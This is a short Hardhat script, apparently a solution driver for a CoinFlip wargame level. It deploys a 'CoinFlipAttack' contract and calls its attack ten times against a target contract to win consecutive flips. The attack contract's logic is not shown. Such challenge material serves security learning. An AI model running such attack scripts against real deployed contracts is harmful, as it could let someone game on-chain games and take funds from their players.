import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x3B02fF1e626Ed7a8fd6eC5299e2C54e1421B626B";
const PLAYER_ADDRESS = "0x976EA74026E726554dB657fA54763abd0C3a0aa9";

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("CoinFlip", CONTRACT_ADDRESS, signer);

    const attackerFactory = await ethers.getContractFactory("CoinFlipAttack");
    const attackerContract = await attackerFactory.deploy();

    for (let i = 0; i < 10; i++) {
        await attackerContract.attack(contract.address);
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
